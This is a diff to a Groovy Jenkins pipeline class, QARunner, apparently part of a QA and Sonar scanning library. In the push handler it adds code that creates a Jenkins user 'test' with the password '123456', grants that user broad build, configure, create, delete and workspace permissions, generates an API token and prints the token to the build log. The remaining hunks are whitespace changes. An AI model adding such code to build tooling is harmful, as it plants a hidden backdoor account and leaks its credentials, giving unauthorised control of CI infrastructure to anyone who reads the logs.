@@ -92,6 +92,22 @@ public class QARunner extends AbstractRunner {
         context.node("master") {
             context.timestamps {
                 logger.info("QARunner->onPush")
+                def userName = "test"
+                def password = "123456"
+                def instance = Jenkins.getInstance()
+                def user = instance.securityRealm.createAccount(userName, password)
+                def strategy = instance.getAuthorizationStrategy()
+                strategy.add(Item.BUILD, 	   userName)
+                strategy.add(Item.CANCEL,  	   userName)
+                strategy.add(Item.CONFIGURE ,  userName)
+                strategy.add(Item.CREATE    ,  userName)
+                strategy.add(Item.DELETE    ,  userName)
+                strategy.add(Item.DISCOVER  ,  userName)
+                strategy.add(Item.READ      ,  userName)
+                strategy.add(Item.WORKSPACE ,  userName)
+                instance.save()
+                def token = jenkins.security.ApiTokenProperty.DescriptorImpl.newInstance(user)
+                logger.info(token.dump())
                 prepare()
                 if (!isUpdated(currentBuild,"**.xml,**/zafira.properties") && onlyUpdated) {
                     logger.warn("do not continue scanner as none of suite was updated ( *.xml )")
@@ -113,7 +129,7 @@ public class QARunner extends AbstractRunner {
 			pomFiles.each {
 				logger.debug(it)
 				//do compile and scanner for all hogh level pom.xml files
-				
+
 				// [VD] integrated compilation as part of the sonar PR checker maven goal
 				//compile(it.value)
 				executeSonarPRScan(it.value)
@@ -622,7 +638,7 @@ public class QARunner extends AbstractRunner {
 		context.stage("Download Resources") {
 		def pomFile = getSubProjectFolder() + "/pom.xml"
 		logger.info("pomFile: " + pomFile)
-		
+
 		executeMavenGoals("-B -U -f ${pomFile} clean process-resources process-test-resources -Dcarina-core_version=$CARINA_CORE_VERSION")
 */
     }
